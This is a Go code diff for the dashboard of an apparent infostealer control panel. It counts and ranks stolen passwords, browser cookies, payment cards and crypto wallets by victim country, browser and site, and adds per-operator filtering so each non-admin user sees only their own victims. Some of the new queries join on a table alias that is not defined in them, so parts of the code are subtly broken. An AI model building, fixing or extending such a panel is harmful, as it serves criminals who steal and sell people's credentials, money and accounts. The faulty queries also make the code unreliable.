@@ -4,6 +4,7 @@ import (
 	"database/sql"
 	"net/http"
 
+	"zialfi-panel/internal/middleware"
 	"zialfi-panel/internal/ws"
 )
 
@@ -70,14 +71,26 @@ func (h *StatsHandler) Dashboard(w http.ResponseWriter, r *http.Request) {
 		TopDomains: []DomainEntry{},
 	}
 
-	h.db.QueryRow("SELECT COUNT(*) FROM sessions").Scan(&resp.Sessions.Total)
-	h.db.QueryRow("SELECT COUNT(*) FROM sessions WHERE date(created_at) = date('now')").Scan(&resp.Sessions.Today)
-	h.db.QueryRow("SELECT COUNT(*) FROM passwords").Scan(&resp.Passwords.Total)
-	h.db.QueryRow("SELECT COUNT(*) FROM cookies").Scan(&resp.Cookies.Total)
-	h.db.QueryRow("SELECT COUNT(*) FROM cards").Scan(&resp.Cards.Total)
-	h.db.QueryRow("SELECT COUNT(*) FROM wallets").Scan(&resp.Wallets.Total)
+	ownerClause := ""
+	var ownerArgs []any
+	if claims := middleware.ClaimsFromContext(r.Context()); claims != nil && claims.Role != "admin" {
+		ownerClause = " AND s.owner_id = ?"
+		ownerArgs = []any{claims.UserID}
+	}
 
-	geoRows, err := h.db.Query("SELECT country_code, COUNT(*) as c FROM sessions WHERE country_code != '' GROUP BY country_code ORDER BY c DESC LIMIT 20")
+	h.db.QueryRow("SELECT COUNT(*) FROM sessions"+whereOwner("", ownerClause), ownerArgs...).Scan(&resp.Sessions.Total)
+	h.db.QueryRow("SELECT COUNT(*) FROM sessions WHERE date(created_at) = date('now')"+ownerClause, ownerArgs...).Scan(&resp.Sessions.Today)
+
+	joinClause := ""
+	if ownerClause != "" {
+		joinClause = " JOIN sessions s ON s.id = p.session_id" + ownerClause
+	}
+	h.db.QueryRow("SELECT COUNT(*) FROM passwords p"+joinClause, ownerArgs...).Scan(&resp.Passwords.Total)
+	h.db.QueryRow("SELECT COUNT(*) FROM cookies c"+joinClause, ownerArgs...).Scan(&resp.Cookies.Total)
+	h.db.QueryRow("SELECT COUNT(*) FROM cards c"+joinClause, ownerArgs...).Scan(&resp.Cards.Total)
+	h.db.QueryRow("SELECT COUNT(*) FROM wallets w"+joinClause, ownerArgs...).Scan(&resp.Wallets.Total)
+
+	geoRows, err := h.db.Query("SELECT s.country_code, COUNT(*) as c FROM sessions s WHERE s.country_code != ''"+ownerClause+" GROUP BY s.country_code ORDER BY c DESC LIMIT 20", ownerArgs...)
 	if err == nil {
 		defer geoRows.Close()
 		for geoRows.Next() {
@@ -88,7 +101,7 @@ func (h *StatsHandler) Dashboard(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 
-	browserRows, err := h.db.Query("SELECT browser, COUNT(*) as c FROM passwords WHERE browser != '' GROUP BY browser ORDER BY c DESC")
+	browserRows, err := h.db.Query("SELECT p.browser, COUNT(*) as c FROM passwords p"+joinClause+" WHERE p.browser != '' GROUP BY p.browser ORDER BY c DESC", ownerArgs...)
 	if err == nil {
 		defer browserRows.Close()
 		for browserRows.Next() {
@@ -99,7 +112,7 @@ func (h *StatsHandler) Dashboard(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 
-	timelineRows, err := h.db.Query("SELECT date(created_at) as d, COUNT(*) FROM sessions WHERE created_at >= datetime('now', '-30 days') GROUP BY d ORDER BY d")
+	timelineRows, err := h.db.Query("SELECT date(s.created_at) as d, COUNT(*) FROM sessions s WHERE s.created_at >= datetime('now', '-30 days')"+ownerClause+" GROUP BY d ORDER BY d", ownerArgs...)
 	if err == nil {
 		defer timelineRows.Close()
 		for timelineRows.Next() {
@@ -114,19 +127,19 @@ func (h *StatsHandler) Dashboard(w http.ResponseWriter, r *http.Request) {
 		SELECT
 			COALESCE(
 				CASE
-					WHEN url LIKE 'https://%' THEN SUBSTR(url, 9)
-					WHEN url LIKE 'http://%' THEN SUBSTR(url, 8)
-					ELSE url
+					WHEN p.url LIKE 'https://%' THEN SUBSTR(p.url, 9)
+					WHEN p.url LIKE 'http://%' THEN SUBSTR(p.url, 8)
+					ELSE p.url
 				END,
-				url
+				p.url
 			) as domain,
 			COUNT(*) as c
-		FROM passwords
-		WHERE url != ''
+		FROM passwords p`+joinClause+`
+		WHERE p.url != ''
 		GROUP BY domain
 		ORDER BY c DESC
 		LIMIT 20
-	`)
+	`, ownerArgs...)
 	if err == nil {
 		defer domainRows.Close()
 		for domainRows.Next() {
@@ -147,4 +160,15 @@ func (h *StatsHandler) Dashboard(w http.ResponseWriter, r *http.Request) {
 		})
 		h.hub.Broadcast("stats", event)
 	}
+}
+
+// whereOwner joins an owner clause onto an existing WHERE-less query.
+func whereOwner(base, ownerClause string) string {
+	if ownerClause == "" {
+		return ""
+	}
+	if base == "" {
+		return " WHERE 1=1" + ownerClause
+	}
+	return " WHERE " + base + ownerClause
 }
